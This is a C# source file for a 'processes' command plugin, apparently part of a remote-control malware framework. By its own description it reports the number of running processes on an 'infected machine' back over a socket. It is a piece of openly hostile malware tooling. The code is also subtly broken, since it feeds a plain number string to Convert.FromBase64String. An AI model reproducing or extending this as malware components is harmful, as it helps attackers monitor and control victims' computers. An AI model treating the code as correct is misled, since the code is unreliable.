using Common.Attributes;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.Serialization;

namespace Common.Commands.Collector_Commands
{
    [Serializable]
    [CommandName("processes")]
    public class Processes_Command : Command
    {
        public void execute(Socket sendTo)
        {
            try
            {
                double runningProcesses = Process.GetProcesses().Length;
                sendTo.Send(System.Convert.FromBase64String(String.Format("{0}", runningProcesses)));
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error occured while executing processes command!\n{0}", ex.ToString());
            }
        }

        public void printDescription()
        {
            Console.WriteLine("This plugin will return the number of running processes on infected machine");
        }

        #region Serializable

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            throw new NotImplementedException();
        }

        #endregion
    }
}
